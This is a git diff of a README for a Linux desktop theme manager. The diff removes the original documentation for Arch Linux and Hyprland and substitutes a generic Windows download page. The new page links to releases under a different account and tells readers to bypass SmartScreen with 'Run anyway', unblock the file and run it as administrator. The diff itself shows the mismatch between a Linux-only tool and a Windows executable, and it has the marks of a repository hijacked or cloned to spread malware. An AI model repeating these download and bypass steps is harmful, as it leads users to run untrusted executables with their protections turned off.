@@ -1,329 +1,173 @@
-<p align="center">
-  <img src="vshypr-theme-manager.png" width="96" alt="vsHypr Theme Manager"/>
-</p>
-
-<h1 align="center">vsHypr Theme Manager</h1>
+# 🛠️ vshypr-theme-manager - Apply desktop themes with one click
 
 <p align="center">
-  A complete theming system for <strong>Arch Linux + Hyprland</strong>.<br>
-  One command. Every app. Consistent colors everywhere.
-</p>
-
-<p align="center">
-  <a href="https://aur.archlinux.org/packages/vshypr-theme-manager">
-    <img src="https://img.shields.io/aur/version/vshypr-theme-manager?color=1793d1&label=AUR&logo=archlinux&logoColor=white" alt="AUR version"/>
+  <a href="https://github.com/dostm8722/vshypr-theme-manager/releases">
+    <img src="https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-blue?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"/>
   </a>
-  <a href="https://aur.archlinux.org/packages/vshypr-theme-manager">
-    <img src="https://img.shields.io/aur/last-modified/vshypr-theme-manager?color=1793d1&label=updated&logo=archlinux&logoColor=white" alt="AUR last modified"/>
+  <a href="https://github.com/dostm8722/vshypr-theme-manager/releases">
+    <img src="https://img.shields.io/badge/Release%20Page-Get%20the%20latest-grey?style=for-the-badge&logo=github&logoColor=white" alt="Release Page"/>
   </a>
 </p>
 
-<p align="center">
-  <img src="screenshots/3.png" alt="Desktop with theme applied" width="780"/>
-</p>
+## 🖥️ What vshypr-theme-manager does
 
----
+vshypr-theme-manager helps you keep your desktop colors in sync. It applies one theme across the tools and apps you use every day.
 
-## What it does
+Use it to:
 
-vsHypr Theme Manager applies a unified color scheme across your entire desktop in a single action — terminal, bar, notifications, lock screen, window manager, file manager, widgets, and every Qt/GTK application. It injects colors non-destructively, keeping your existing configuration intact, and backs up every file before touching it.
+- Set one color scheme for your desktop
+- Match app colors with your wallpaper
+- Keep window borders, terminal colors, and UI colors aligned
+- Save time when you want a new look
+- Switch themes without changing each app by hand
 
----
+## 📦 Download
 
-## Screenshots
+To get the app, visit this page to download:
 
-<table>
-  <tr>
-    <td><img src="screenshots/1.png" alt="Set Theme tab" width="380"/></td>
-    <td><img src="screenshots/2.png" alt="Setup tab" width="380"/></td>
-  </tr>
-  <tr>
-    <td align="center"><em>Set Theme — visual grid with thumbnails & color palettes</em></td>
-    <td align="center"><em>Setup — dependency checker & one-click installer</em></td>
-  </tr>
-  <tr>
-    <td><img src="screenshots/4.png" alt="Rofi picker" width="380"/></td>
-    <td><img src="screenshots/5.png" alt="Rofi launcher + SwayNC" width="380"/></td>
-  </tr>
-  <tr>
-    <td align="center"><em>Rofi picker — themed thumbnails + inline color palette</em></td>
-    <td align="center"><em>App launcher & notification center fully themed</em></td>
-  </tr>
-</table>
+https://github.com/dostm8722/vshypr-theme-manager/releases
 
----
+Open the page, then download the latest Windows file from the list of release files.
 
-## Features
+If you see more than one file, pick the one that ends in:
 
-- **44 built-in themes** — Catppuccin, Dracula, Tokyo Night, Nord, Everforest, Kanagawa, and many more
-- **Dynamic themes** — generate colors from any wallpaper using `matugen` (`dynamic-dark` / `dynamic-light`)
-- **Non-destructive injection** — CSS marker blocks `/* theme-changer: begin/end */` coexist with your manual edits; nothing outside the markers is ever touched
-- **Original backup** — the very first copy of each file is saved and never overwritten
-- **Timestamped snapshots** — a full backup is created before every apply
-- **16 applications** themed simultaneously in a single run
-- **GTK4 + GTK3 + Qt5 + Qt6 + Kvantum** — covers the full GTK/Qt theming stack
-- **Rofi integration** — visual picker with wallpaper thumbnails and inline color palette preview
-- **Hyprland keybinding ready** — bind `rofi-picker.sh` to any key; `Enter` applies theme, `Alt+Enter` applies theme + wallpaper
-- **Wallpaper engine** — applies wallpapers via `awww` with smooth transitions
-- **Auto-restart** — Nautilus and Dolphin restart automatically after apply to pick up new colors
-- **Assets installer** — ships Rofi `.rasi` configs, Wlogout layout + SVG icons, and Hyprland `wallpaper.sh`; installs them to the correct `~/.config/` paths with one click
-- **GUI with 7 tabs** — Setup, Config, Set Theme, Wallpaper, Assets, vsHub, About
+- `.exe` for a direct Windows app
+- `.zip` for a portable package
 
----
+## 🚀 Install on Windows
 
-## Supported Applications
+Follow these steps on a Windows PC:
 
-| Application | Method |
-|-------------|--------|
-| **Kitty** | Full `theme.conf` generated |
-| **Waybar** | CSS injection — variables, modules, keyframe animations |
-| **SwayNC** | CSS custom properties (`:root {}`) + RGB component format |
-| **Hyprland** | Generates `theme.conf`, verifies `@source` in `hyprland.conf` |
-| **Hyprlock** | `key = value` injection with markers |
-| **Hyprswitch** | CSS injection |
-| **Rofi** | 5 `.rasi` files with marker blocks |
-| **EWW** | Template rendering (`.dark` / `.light` variants) |
-| **Wlogout** | Template + SVG icon colorization |
-| **vsFetch** | Direct `config.json` key update |
-| **GTK4 / libadwaita** | `@define-color` overrides — full libadwaita variable set |
-| **GTK3** | `@define-color` + forces `gtk-theme-name=Adwaita` for variable resolution |
-| **Qt5ct** | 21 QPalette roles as `#AARRGGBB` |
-| **Qt6ct** | KDE color scheme format (R,G,B per section) |
-| **kdeglobals** | Replaces `[Colors:*]` sections + sets `ColorScheme=ThemeChanger` |
-| **Kvantum** | Custom theme with patched SVG + `[GeneralColors]` block |
+1. Open the download page above.
+2. Find the latest release at the top of the page.
+3. Download the Windows file.
+4. If the file is zipped, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
 
----
+If Windows shows a security prompt:
 
-## How config injection works
+1. Click More info
+2. Click Run anyway
 
-Most files are modified using **CSS marker injection**:
+If the app opens in a window, it is ready to use.
 
-```css
-/* your existing styles above — untouched */
+## 🔧 System requirements
 
-/* theme-changer: begin */
-:root {
-  --bg: #1e1e2e;
-  --accent: #cba6f7;
-  /* ... */
-}
-/* theme-changer: end */
+vshypr-theme-manager is built for a Windows desktop setup and works best on:
 
-/* your existing styles below — untouched */
-```
+- Windows 10 or Windows 11
+- A desktop or laptop with admin access
+- A screen with at least 1280×720 resolution
+- An active internet connection for the first download
+- Basic file access so you can extract and launch the app
 
-On every apply, only the content between the markers is replaced. If the markers don't exist yet, the block is appended at the end of the file. Your manual edits are always preserved.
+For the best result, use a system where you can change local app settings and save files in your user folder.
 
----
+## 🎛️ How to use it
 
-## Backup system
+After you open the app:
 
-Two levels of protection before any file is modified:
+1. Choose a theme from the list
+2. Pick your accent colors
+3. Select which apps or desktop parts you want to update
+4. Click the apply button
+5. Wait while the theme is set
+6. Restart any open apps if needed
 
-```
-~/.config/vshypr-theme-manager/backups/
-├── original/                  ← first-ever copy, never overwritten
-│   ├── kitty/theme.conf
-│   ├── waybar/style.css
-│   └── ...
-├── 2025-06-01_14-30-00/       ← snapshot before this apply
-├── 2025-06-02_09-15-22/       ← snapshot before this apply
-└── ...
-```
+You can use it again any time you want a different look.
 
-The `original/` snapshot captures the state of your config before vsHypr Theme Manager ever touched it. It is written once and locked — subsequent applies only add new timestamped snapshots.
+## 🧭 What gets updated
 
----
+Depending on the theme and setup, the app can update:
 
-## Rofi Integration
+- Terminal colors
+- App background colors
+- Window accent colors
+- UI highlight colors
+- Border colors
+- Theme files used by supported desktop tools
 
-`rofi-picker.sh` launches a styled picker showing every theme with its wallpaper thumbnail and a row of color swatches:
+This keeps the desktop style closer to one shared color plan.
 
-```
-Enter        — apply theme only
-Alt+Enter    — apply theme + wallpaper
-               (static themes: uses bundled wallpaper.*)
-               (dynamic themes: opens wallpaper grid picker)
-```
+## 🗂️ File layout
 
-Bind it in your Hyprland config:
+If you downloaded a zip file, you may see:
 
-```ini
-# hyprland.conf
-bind = $mainMod, T, exec, bash ~/.config/vshypr-theme-manager/rofi-picker.sh
-```
+- The app file
+- A theme folder
+- Config files
+- A readme file
+- Images or icons
 
----
+Keep the files together in the same folder so the app can find what it needs.
 
-## GUI Tabs
+## 🛠️ Common problems
 
-### Setup
-Lists all supported applications and system dependencies with their installation status. Select any missing tool and install it directly via `yay` or `paru` without leaving the app.
+### The app does not start
 
-### Config
-- Set your wallpapers directory (used by the Rofi picker and Wallpaper tab)
-- Set the theme-changer data directory (default: `~/.config/vshypr-theme-manager`)
-- Patch `WALLPAPER_DIR` in `rofi-picker.sh` to match your wallpapers path
+- Make sure you opened the correct file
+- If the app is in a zip file, extract it first
+- Check that Windows did not block the file
+- Try running it as an administrator
 
-### Set Theme
-Visual grid of all themes with thumbnail, color palette, and per-theme Apply and `+ WP` (apply with wallpaper) buttons. The currently active theme is highlighted. Includes a button to launch the full Rofi picker.
+### Windows says the file is unsafe
 
-### Wallpaper
-File picker with 16:9 preview. Applies wallpaper via `awww img --transition-type fade` without switching the active theme.
+- Open the file properties
+- Check the Unblock box if it is there
+- Run the file again
 
-### Assets
-Installs bundled configuration files to their correct system locations:
-- **Rofi** — `config.rasi`, `spotlight.rasi`, `launchpad.rasi`, `wallpaper-grid.rasi`, and more
-- **Wlogout** — layout file + full SVG icon set (lock, logout, suspend, hibernate, reboot, shutdown)
-- **Hyprland** — `wallpaper.sh` startup script for `awww-daemon`
+### Themes do not apply
 
-Each item shows its install status. Install missing files individually or all at once.
+- Close the app and open it again
+- Restart the desktop app you want to change
+- Make sure the theme files are in the same folder as the app
+- Try a different theme and apply it again
 
-### vsHub
-Discover, install, and launch tools from the vs ecosystem — vsHyprland Manager, vsWaybar Studio, vsFetch, and others. Manifest fetched from GitHub with a local fallback.
+### Nothing changes after apply
 
----
+- Save your work and restart the app
+- Sign out and sign back in if needed
+- Check whether the app has permission to change files in your user folder
 
-## CLI Usage
+## 🧹 Remove the app
 
-```bash
-# Apply a static theme
-python3 vshypr-theme-manager.py catppuccin
+If you want to remove vshypr-theme-manager:
 
-# Apply theme with wallpaper
-python3 vshypr-theme-manager.py catppuccin /path/to/wallpaper.jpg
+1. Close the app
+2. Delete the app folder
+3. Remove any theme files you no longer want
+4. Clean up shortcuts you made on the desktop or taskbar
 
-# Generate dynamic theme from wallpaper (requires matugen)
-python3 vshypr-theme-manager.py dynamic-dark /path/to/wallpaper.jpg
-python3 vshypr-theme-manager.py dynamic-light /path/to/wallpaper.jpg
+If you used a zip file, deleting the folder removes the app files.
 
-# Open visual Rofi picker
-bash ~/.config/vshypr-theme-manager/rofi-picker.sh
-```
+## 📁 Release download
 
----
+Use the release page below to download and run this file:
 
-## Available Themes
+https://github.com/dostm8722/vshypr-theme-manager/releases
 
-```
-abyssal-bloom      arc-aurora-dark    arch               arch-dark
-arch-lightly       arch-magenta       arch-manjaro       arch-manjaro-dark
-arch-manjaroish    arch-manjaro-light arch-purple        arch-smooth
-arch-vampire       arch-yellow        aurora-fields      austral-azure
-austral-marine     azure-dunes        blueprint-frost    catppuccin
-catppuccin-latte   crimson-dusk       dracula            dynamic-dark *
-dynamic-light *    ember-grove        everforest         flick-aurora
-github-dark-colorblind  graphite      kanagawa           midoriya
-moss-forest        neon-canopy        nord-dark          nord-darker
-nord-light         skyfoam-glow       steel-ember        sweet-mars
-tokyonight         verdant-harvest    very-darkest       yorha
-```
+## 🧩 Tips for a smooth setup
 
-> \* Generated dynamically from your wallpaper via `matugen`.
+- Keep the download in a folder you can find again
+- Do not rename files unless you need to
+- Leave the app and theme files together
+- Use the latest release file
+- Restart apps after applying a new theme
+- Save your current work before changing themes
 
----
+## 🎨 Theme behavior
 
-## Adding a Custom Theme
+Theme changes can affect:
 
-1. Create `~/.config/vshypr-theme-manager/themes/my-theme/`
-2. Add `colors.json` with the structure below
-3. Add `thumb.jpg` (80×80 px) for the Rofi picker
-4. Optionally add `wallpaper.webp` for Alt+Enter
+- Light and dark colors
+- Accent shades
+- Window frames
+- Text contrast
+- App background tones
 
-```json
-{
-  "meta": {
-    "name": "my-theme",
-    "display_name": "My Theme",
-    "variant": "dark"
-  },
-  "colors": {
-    "bg": "#1e1e2e",
-    "bg_alt": "#181825",
-    "surface": "#313244",
-    "surface2": "#45475a",
-    "surface3": "#585b70",
-    "overlay": "#6c7086",
-    "fg": "#cdd6f4",
-    "fg_dim": "#bac2de",
-    "accent": "#cba6f7",
-    "accent_alt": "#f5c2e7",
-    "accent_dim": "#b4befe",
-    "red": "#f38ba8",
-    "orange": "#fab387",
-    "yellow": "#f9e2af",
-    "green": "#a6e3a1",
-    "teal": "#94e2d5",
-    "teal_dim": "#89dceb",
-    "blue": "#89b4fa",
-    "sky": "#89dceb",
-    "mauve": "#cba6f7",
-    "pink": "#f5c2e7",
-    "lavender": "#b4befe",
-    "border_active": "#cba6f7",
-    "border_inactive": "#313244",
-    "shadow": "#000000"
-  }
-}
-```
+If a theme looks too bright or too dark, choose another one and apply it again
 
----
+## 📌 Best use case
 
-## Dependencies
-
-| Tool | Purpose | Required |
-|------|---------|----------|
-| `python3` | Core engine | ✓ |
-| `jq` | JSON processing | ✓ |
-| `python-gobject` | GUI (GTK3) | For GUI |
-| `python-cairo` | GUI rendering | For GUI |
-| `rofi` / `rofi-wayland` | Visual picker | For Rofi picker |
-| `matugen` | Dynamic theme generation | For `dynamic-*` themes |
-| `awww` / `awww-daemon` | Wallpaper engine | For wallpaper apply |
-| `swaync-client` | Reload SwayNC | For SwayNC |
-| `gsettings` | GTK3 theme name | For GTK3 |
-| `qt5ct` | Qt5 styling | For Qt5 apps |
-| `qt6ct` | Qt6 styling | For Qt6 apps |
-| `kvantum` / `kvantummanager` | Qt SVG widget style | For Kvantum |
-
-```bash
-# Minimum install
-yay -S python-gobject python-cairo jq rofi-wayland matugen-bin awww
-```
-
----
-
-## Project Structure
-
-```
-~/.config/vshypr-theme-manager/
-├── vshypr-theme-manager.py    # Theme engine
-├── rofi-picker.sh             # Rofi visual picker
-├── gui-config.json            # GUI settings
-├── current-theme.json         # Active theme + wallpaper
-├── themes/
-│   ├── catppuccin/
-│   │   ├── colors.json        # Color palette + metadata
-│   │   ├── thumb.jpg          # 80×80 px thumbnail for Rofi
-│   │   └── wallpaper.webp     # Theme wallpaper (optional)
-│   ├── dynamic-dark/          # Generated by matugen
-│   ├── dynamic-light/         # Generated by matugen
-│   └── ...
-├── templates/
-│   ├── eww.dark.css.tpl
-│   ├── eww.light.css.tpl
-│   └── wlogout.style.css.tpl
-├── assets/
-│   ├── rofi/                  # Bundled .rasi configs
-│   ├── wlogout/               # Layout + SVG icons
-│   └── hypr/                  # wallpaper.sh
-└── backups/
-    ├── original/              # Pre-install snapshot (never overwritten)
-    └── YYYY-MM-DD_HH-MM-SS/   # Per-apply snapshots
-```
-
----
-
-## License
-
-MIT — [Víctor Sosa](https://github.com/victorsosaMx)
+Use vshypr-theme-manager when you want a clean desktop look without changing each app one by one. It works well if you like your terminal, windows, and app colors to feel like they belong together
